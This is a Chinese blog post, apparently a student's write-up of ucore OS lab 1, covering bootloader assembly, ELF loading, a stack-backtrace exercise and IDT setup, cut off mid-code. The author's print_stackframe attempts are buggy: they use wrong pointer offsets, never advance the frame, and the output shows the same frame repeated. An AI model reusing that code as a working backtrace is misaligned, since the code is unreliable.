<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">seta20<span class="number">.1</span>:				<span class="comment">// 等待8042键盘控制器不忙</span></span><br><span class="line">│   <span class="number">0x7c0a</span>      in     $<span class="number">0x64</span>,%al</span><br><span class="line">│   <span class="number">0x7c0c</span>      test   $<span class="number">0x2</span>,%al </span><br><span class="line">│   <span class="number">0x7c0e</span>      jne    <span class="number">0x7c0a</span> </span><br><span class="line">│   <span class="number">0x7c10</span>      mov    $<span class="number">0xd1</span>,%al</span><br><span class="line">│   <span class="number">0x7c12</span>      out    %al,$<span class="number">0x64</span>   </span><br><span class="line">seta20<span class="number">.1</span>:				<span class="comment">// 等待8042键盘控制器不忙   </span></span><br><span class="line">│   <span class="number">0x7c14</span>      in     $<span class="number">0x64</span>,%al                 </span><br><span class="line">│   <span class="number">0x7c16</span>      test   $<span class="number">0x2</span>,%al            </span><br><span class="line">│   <span class="number">0x7c18</span>      jne    <span class="number">0x7c14</span>          </span><br><span class="line">│   <span class="number">0x7c1a</span>      mov    $<span class="number">0xdf</span>,%al <span class="comment">// 打开A20         </span></span><br><span class="line">│   <span class="number">0x7c1c</span>      out    %al,$<span class="number">0x60</span>      </span><br></pre></td></tr></table></figure>
<p><strong>初始化GDT表</strong></p>
<p>一个简单的GDT表和其描述符已经静态储存在引导区中，载入即可</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">│   <span class="number">0x7c1e</span>      lgdtl  (%esi) </span><br></pre></td></tr></table></figure>
<p><strong>进入保护模式</strong></p>
<p>通过将cr0寄存器PE位置1便开启了保护模式</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">│  &gt;<span class="number">0x7c23</span>      mov    %cr0,%eax <span class="comment">// cr0 to eax             </span></span><br><span class="line">│   <span class="number">0x7c26</span>      <span class="keyword">or</span>     $<span class="number">0x1</span>,%ax <span class="comment">// 或操作(PE位变为&#x27;1&#x27;)                 </span></span><br><span class="line">│   <span class="number">0x7c2a</span>      mov    %eax,%cr0 <span class="comment">// eax to cr0   </span></span><br></pre></td></tr></table></figure>
<p>设置段寄存器，并建立堆栈：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">│  &gt;<span class="number">0x7c32</span>      mov    $<span class="number">0x10</span>,%ax <span class="comment">// 段寄存器全部初始化为&#x27;0x10&#x27;        </span></span><br><span class="line">│   <span class="number">0x7c36</span>      mov    %eax,%ds                                               </span><br><span class="line">│   <span class="number">0x7c38</span>      mov    %eax,%es                                              </span><br><span class="line">│   <span class="number">0x7c3a</span>      mov    %eax,%fs                                            </span><br><span class="line">│   <span class="number">0x7c3c</span>      mov    %eax,%gs                                              </span><br><span class="line">│   <span class="number">0x7c3e</span>      mov    %eax,%ss                                             </span><br><span class="line">│   <span class="number">0x7c40</span>      mov    $<span class="number">0x0</span>,%ebp                                             </span><br><span class="line">│   <span class="number">0x7c45</span>      mov    $<span class="number">0x7c00</span>,%esp <span class="comment">// 设置0x7c00为栈顶  </span></span><br></pre></td></tr></table></figure>
<p>转到保护模式完成，进入boot主方法：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">│   <span class="number">0x7c4a</span>      call   <span class="number">0x7d0f</span> </span><br><span class="line">------------------------------------</span><br><span class="line">│  &gt;<span class="number">0x7d13</span>      push   %ebp                                                   │</span><br><span class="line">│   <span class="number">0x7d14</span>      <span class="keyword">xor</span>    %ecx,%ecx                                              │</span><br><span class="line">│   <span class="number">0x7d16</span>      mov    %esp,%ebp                                              │</span><br><span class="line">│   <span class="number">0x7d18</span>      mov    $<span class="number">0x1000</span>,%edx                                           │</span><br><span class="line">│   <span class="number">0x7d1d</span>      push   %esi                                                   │</span><br><span class="line">│   <span class="number">0x7d1e</span>      mov    $<span class="number">0x10000</span>,%eax                                          │</span><br><span class="line">│   <span class="number">0x7d23</span>      push   %ebx                                                   │</span><br><span class="line">│   <span class="number">0x7d24</span>      call   <span class="number">0x7c72</span>                                                 │</span><br><span class="line">│   <span class="number">0x7d29</span>      cmpl   $<span class="number">0x464c457f</span>,<span class="number">0x10000</span>                                    │</span><br><span class="line">│   <span class="number">0x7d33</span>      jne    <span class="number">0x7d74</span>    </span><br></pre></td></tr></table></figure>
<h2 id="练习4-分析bootloader加载ELF格式的OS的过程"><a href="#练习4-分析bootloader加载ELF格式的OS的过程" class="headerlink" title="练习4 - 分析bootloader加载ELF格式的OS的过程"></a>练习4 - 分析bootloader加载ELF格式的OS的过程</h2><p><code>readsect</code>：从设备的第secno扇区读取数据到dst位置</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">readsect</span><span class="params">(<span class="keyword">void</span> *dst, <span class="keyword">uint32_t</span> secno)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// wait for disk to be ready</span></span><br><span class="line">    waitdisk();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 把信息写入段号口</span></span><br><span class="line">    outb(<span class="number">0x1F2</span>, <span class="number">1</span>); <span class="comment">// count = 1(设置读取扇区的数目为1)</span></span><br><span class="line">    outb(<span class="number">0x1F3</span>, secno &amp; <span class="number">0xFF</span>);</span><br><span class="line">    outb(<span class="number">0x1F4</span>, (secno &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">    outb(<span class="number">0x1F5</span>, (secno &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">    outb(<span class="number">0x1F6</span>, ((secno &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xF</span>) | <span class="number">0xE0</span>);</span><br><span class="line">    outb(<span class="number">0x1F7</span>, <span class="number">0x20</span>); <span class="comment">// cmd 0x20 - read sectors(读取扇区)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for disk to be ready</span></span><br><span class="line">    waitdisk();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read a sector</span></span><br><span class="line">    insl(<span class="number">0x1F0</span>, dst, SECTSIZE / <span class="number">4</span>); <span class="comment">// 读取到dst位置(幻数4因为这里以DW为单位)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>readseg</code>：简单包装了 readsect，可以从设备读取任意长度的内容（指定了要读取的字节数）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">readseg</span><span class="params">(<span class="keyword">uintptr_t</span> va, <span class="keyword">uint32_t</span> count, <span class="keyword">uint32_t</span> offset)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uintptr_t</span> end_va = va + count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 四舍五入到扇区边界</span></span><br><span class="line">    va -= offset % SECTSIZE;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将字节转换为扇区，内核从&#x27;扇区1&#x27;开始</span></span><br><span class="line">    <span class="keyword">uint32_t</span> secno = (offset / SECTSIZE) + <span class="number">1</span>;</span><br><span class="line">	    <span class="comment">// +1:因为&#x27;0扇区&#x27;被引导占用,所以ELF文件从&#x27;1扇区&#x27;开始</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (; va &lt; end_va; va += SECTSIZE, secno ++) &#123;</span><br><span class="line">        readsect((<span class="keyword">void</span> *)va, secno); <span class="comment">// 每次读一个扇区</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>bootmain</code>函数中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">bootmain(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="comment">// 首先读取ELF的头部</span></span><br><span class="line">    readseg((<span class="keyword">uintptr_t</span>)ELFHDR, SECTSIZE * <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过储存在头部的幻数判断是否是合法的ELF文件</span></span><br><span class="line">    <span class="keyword">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> *<span class="title">ph</span>, *<span class="title">eph</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ELF头部有描述ELF文件应加载到内存什么位置的描述表，先将描述表的头地址存在ph</span></span><br><span class="line">    ph = (struct proghdr *)((<span class="keyword">uintptr_t</span>)ELFHDR + ELFHDR-&gt;e_phoff);</span><br><span class="line">    eph = ph + ELFHDR-&gt;e_phnum;</span><br><span class="line">    <span class="comment">// 按照描述表将ELF文件中数据载入内存</span></span><br><span class="line">    <span class="keyword">for</span> (; ph &lt; eph; ph ++) &#123;</span><br><span class="line">        readseg(ph-&gt;p_va &amp; <span class="number">0xFFFFFF</span>, ph-&gt;p_memsz, ph-&gt;p_offset);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ELF文件0x1000位置后面的0xd1ec比特被载入内存0x00100000</span></span><br><span class="line">    <span class="comment">// ELF文件0xf000位置后面的0x1d20比特被载入内存0x0010e000</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 根据ELF头部储存的入口信息，找到内核的入口</span></span><br><span class="line">    ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))(ELFHDR-&gt;e_entry &amp; <span class="number">0xFFFFFF</span>))();</span><br><span class="line"></span><br><span class="line">bad:</span><br><span class="line">    outw(<span class="number">0x8A00</span>, <span class="number">0x8A00</span>);</span><br><span class="line">    outw(<span class="number">0x8A00</span>, <span class="number">0x8E00</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* do nothing */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="练习5-实现函数调用堆栈跟踪函数"><a href="#练习5-实现函数调用堆栈跟踪函数" class="headerlink" title="练习5 - 实现函数调用堆栈跟踪函数"></a>练习5 - 实现函数调用堆栈跟踪函数</h2><p>终于遇到一个需要写的练习了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_stackframe</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">     <span class="comment">/* LAB1 YOUR CODE : STEP 1 */</span></span><br><span class="line">     <span class="comment">/* (1) call read_ebp() to get the value of ebp. the type is (uint32_t);</span></span><br><span class="line"><span class="comment">      * (2) call read_eip() to get the value of eip. the type is (uint32_t);</span></span><br><span class="line"><span class="comment">      * (3) from 0 .. STACKFRAME_DEPTH</span></span><br><span class="line"><span class="comment">      *    (3.1) printf value of ebp, eip</span></span><br><span class="line"><span class="comment">      *    (3.2) (uint32_t)calling arguments [0..4] = the contents in address (uint32_t)ebp +2 [0..4]</span></span><br><span class="line"><span class="comment">      *    (3.3) cprintf(&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">      *    (3.4) call print_debuginfo(eip-1) to print the C calling function name and line number, etc.</span></span><br><span class="line"><span class="comment">      *    (3.5) popup a calling stackframe</span></span><br><span class="line"><span class="comment">      *           NOTICE: the calling funciton&#x27;s return addr eip  = ss:[ebp+4]</span></span><br><span class="line"><span class="comment">      *                   the calling funciton&#x27;s ebp = ss:[ebp]</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然不是从零开始，程序已经写好了一些函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACKFRAME_DEPTH 20</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> __noinline <span class="keyword">uint32_t</span> <span class="title">read_eip</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> eip;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;movl 4(%%ebp), %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (eip))</span></span>;</span><br><span class="line">    <span class="keyword">return</span> eip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uint32_t</span> <span class="title">read_ebp</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> ebp;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(<span class="string">&quot;movl %%ebp, %0&quot;</span> : <span class="string">&quot;=r&quot;</span> (ebp))</span></span>;</span><br><span class="line">    <span class="keyword">return</span> ebp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_debuginfo</span><span class="params">(<span class="keyword">uintptr_t</span> eip)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">eipdebuginfo</span> <span class="title">info</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (debuginfo_eip(eip, &amp;info) != <span class="number">0</span>) &#123;</span><br><span class="line">        cprintf(<span class="string">&quot;    &lt;unknow&gt;: -- 0x%08x --\n&quot;</span>, eip);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">char</span> fnname[<span class="number">256</span>];</span><br><span class="line">        <span class="keyword">int</span> j;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; info.eip_fn_namelen; j ++) &#123;</span><br><span class="line">            fnname[j] = info.eip_fn_name[j];</span><br><span class="line">        &#125;</span><br><span class="line">        fnname[j] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        cprintf(<span class="string">&quot;    %s:%d: %s+%d\n&quot;</span>, info.eip_file, info.eip_line,</span><br><span class="line">                fnname, eip - info.eip_fn_addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>翻译翻译实验想让我们干什么：</p>
<ul>
<li>打印 ebp eip 的地址</li>
<li>打印调用的参数</li>
<li>调用“print_debuginfo（eip-1）”打印C调用函数名和行号等</li>
<li>弹出一个调用堆栈帧（按照提示做）</li>
</ul>
<p>首次进行尝试：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_stackframe</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> ebp = read_ebp();</span><br><span class="line">    <span class="keyword">size_t</span> eip = read_eip();</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 这里一定要使用&quot;cprintf&quot;，原版&quot;printf&quot;直接报错</span></span><br><span class="line">    cprintf(<span class="string">&quot;ebp:0x%08x eip:0x%08x&quot;</span>,ebp,eip); </span><br><span class="line">    cprintf(<span class="string">&quot;args:0x%08x\n&quot;</span>,*(<span class="keyword">size_t</span>*)(ebp+<span class="number">1</span>)); <span class="comment">// 写在一起不好看</span></span><br><span class="line">    cprintf(<span class="string">&quot;args:0x%08x\n&quot;</span>,*(<span class="keyword">size_t</span>*)(ebp+<span class="number">2</span>));</span><br><span class="line">    cprintf(<span class="string">&quot;args:0x%08x\n&quot;</span>,*(<span class="keyword">size_t</span>*)(ebp+<span class="number">3</span>));</span><br><span class="line">    cprintf(<span class="string">&quot;args:0x%08x\n&quot;</span>,*(<span class="keyword">size_t</span>*)(ebp+<span class="number">4</span>));</span><br><span class="line">    </span><br><span class="line">    cprintf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    print_debuginfo(eip - <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    eip = *(<span class="keyword">size_t</span>*)(ebp + <span class="number">1</span>);</span><br><span class="line">    ebp = *(<span class="keyword">size_t</span>*)(ebp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>回头看答案发现我少了一个循环，后来发现这是要求的一部分，另外，“read_ebp”和“read_eip”的返回参数类型是“uint32_t”，还是改为“uint32_t”比较好</p>
<p>再次尝试：（部分地方进行了修改）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_stackframe</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> ebp = read_ebp();</span><br><span class="line">    <span class="keyword">uint32_t</span> eip = read_eip();</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; ebp != <span class="number">0</span> &amp;&amp; i &lt; STACKFRAME_DEPTH; i ++) &#123;</span><br><span class="line">        cprintf(<span class="string">&quot;ebp:0x%08x eip:0x%08x\n&quot;</span>,ebp,eip); </span><br><span class="line">        cprintf(<span class="string">&quot;args_1:0x%08x\n&quot;</span>,*(<span class="keyword">uint32_t</span>*)(ebp+<span class="number">1</span>));</span><br><span class="line">        cprintf(<span class="string">&quot;args_2:0x%08x\n&quot;</span>,*(<span class="keyword">uint32_t</span>*)(ebp+<span class="number">2</span>));</span><br><span class="line">        cprintf(<span class="string">&quot;args_3:0x%08x\n&quot;</span>,*(<span class="keyword">uint32_t</span>*)(ebp+<span class="number">3</span>));</span><br><span class="line">        cprintf(<span class="string">&quot;args_4:0x%08x\n&quot;</span>,*(<span class="keyword">uint32_t</span>*)(ebp+<span class="number">4</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    cprintf(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    print_debuginfo(eip - <span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">    eip = *(<span class="keyword">uint32_t</span>*)(ebp + <span class="number">1</span>);</span><br><span class="line">    ebp = *(<span class="keyword">uint32_t</span>*)(ebp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>效果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  lab1 (THU.CST) os is loading ...</span><br><span class="line"></span><br><span class="line">Special kernel symbols:</span><br><span class="line">  entry  <span class="number">0x00100000</span> (phys)</span><br><span class="line">  etext  <span class="number">0x001032e9</span> (phys)</span><br><span class="line">  edata  <span class="number">0x0010ea16</span> (phys)</span><br><span class="line">  end    <span class="number">0x0010fd20</span> (phys)</span><br><span class="line">Kernel executable memory footprint: <span class="number">64</span>KB</span><br><span class="line">ebp:<span class="number">0x00007b28</span> eip:<span class="number">0x00100a63</span></span><br><span class="line">args_1:<span class="number">0x6a00007b</span></span><br><span class="line">args_2:<span class="number">0x0d6a0000</span></span><br><span class="line">args_3:<span class="number">0x100d6a00</span></span><br><span class="line">args_4:<span class="number">0x00100d6a</span></span><br><span class="line">ebp:<span class="number">0x00007b28</span> eip:<span class="number">0x00100a63</span></span><br><span class="line">args_1:<span class="number">0x6a00007b</span></span><br><span class="line">args_2:<span class="number">0x0d6a0000</span></span><br><span class="line">args_3:<span class="number">0x100d6a00</span></span><br><span class="line">args_4:<span class="number">0x00100d6a</span></span><br></pre></td></tr></table></figure>
<h2 id="练习6-完善中断初始化和处理"><a href="#练习6-完善中断初始化和处理" class="headerlink" title="练习6 - 完善中断初始化和处理"></a>练习6 - 完善中断初始化和处理</h2><p>中断描述符表（Interrupt Descriptor Table，IDT）是保护模式下用于存储中断处理程序的数据结构，CPU在接收到中断时，会根据中断向量在中断描述符表中检索对应的描述符</p>
<p>实验目的：</p>
<ul>
<li>请编程完善“kern/trap/trap.c”中对中断向量表进行初始化的函数idt_init</li>
<li>在idt_init函数中，依次对所有中断入口进行初始化</li>
<li>使用mmu.h中的SETGATE宏，填充idt数组内容</li>
<li>每个中断的入口由“tools/vectors.c”生成，使用trap.c中声明的vectors数组即可</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* idt_init - initialize IDT to each of the entry points in kern/trap/vectors.S */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">idt_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">     <span class="comment">/* LAB1 YOUR CODE : STEP 2 */</span></span><br><span class="line">     <span class="comment">/* (1) Where are the entry addrs of each Interrupt Service Routine (ISR)?</span></span><br><span class="line"><span class="comment">      *     All ISR&#x27;s entry addrs are stored in __vectors. where is uintptr_t __vectors[] ?</span></span><br><span class="line"><span class="comment">      *     __vectors[] is in kern/trap/vector.S which is produced by tools/vector.c</span></span><br><span class="line"><span class="comment">      *     (try &quot;make&quot; command in lab1, then you will find vector.S in kern/trap DIR)</span></span><br><span class="line"><span class="comment">      *     You can use  &quot;extern uintptr_t __vectors[];&quot; to define this extern variable which will be used later.</span></span><br><span class="line"><span class="comment">      * (2) Now you should setup the entries of ISR in Interrupt Description Table (IDT).</span></span><br><span class="line"><span class="comment">      *     Can you see idt[256] in this file? Yes, it&#x27;s IDT! you can use SETGATE macro to setup each item of IDT</span></span><br><span class="line"><span class="comment">      * (3) After setup the contents of IDT, you will let CPU know where is the IDT by using &#x27;lidt&#x27; instruction.</span></span><br><span class="line"><span class="comment">      *     You don&#x27;t know the meaning of this instruction? just google it! and check the libs/x86.h to know more.</span></span><br><span class="line"><span class="comment">      *     Notice: the argument of lidt is idt_pd. try to find it!</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* trap_dispatch - dispatch based on what type of trap occurred */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">trap_dispatch</span><span class="params">(struct trapframe *tf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (tf-&gt;tf_trapno) &#123;</span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_TIMER:</span><br><span class="line">        <span class="comment">/* LAB1 YOUR CODE : STEP 3 */</span></span><br><span class="line">        <span class="comment">/* handle the timer interrupt */</span></span><br><span class="line">        <span class="comment">/* (1) After a timer interrupt, you should record this event using a global variable (increase it), such as ticks in kern/driver/clock.c</span></span><br><span class="line"><span class="comment">         * (2) Every TICK_NUM cycle, you can print some info using a funciton, such as print_ticks().</span></span><br><span class="line"><span class="comment">         * (3) Too Simple? Yes, I think so!</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_COM1:</span><br><span class="line">        c = cons_getc();</span><br><span class="line">        cprintf(<span class="string">&quot;serial [%03d] %c\n&quot;</span>, c, c);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_KBD:</span><br><span class="line">        c = cons_getc();</span><br><span class="line">        cprintf(<span class="string">&quot;kbd [%03d] %c\n&quot;</span>, c, c);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">//LAB1 CHALLENGE 1 : YOUR CODE you should modify below codes.</span></span><br><span class="line">    <span class="keyword">case</span> T_SWITCH_TOU:</span><br><span class="line">    <span class="keyword">case</span> T_SWITCH_TOK:</span><br><span class="line">        panic(<span class="string">&quot;T_SWITCH_** ??\n&quot;</span>);</span><br><span class="line">        